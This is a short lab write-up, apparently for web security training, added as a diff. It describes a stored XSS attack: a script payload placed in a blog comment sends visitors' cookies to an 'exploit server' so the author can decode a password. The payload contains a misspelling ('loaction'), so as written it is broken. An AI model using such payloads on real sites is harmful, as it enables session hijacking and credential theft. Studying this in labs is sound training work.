@@ -1,0 +1,7 @@
+In this Lab
+first go to home page of website and open a post
+go to comment section and add this XSS payload
+
+<script>document.loaction='exploit server address'+document.cookie</script>
+
+this will do that when ever a user comes to the website it will create a request to my exploit server and add that user's cookie with the request and this is how i will get the cookie and decode to get the password.
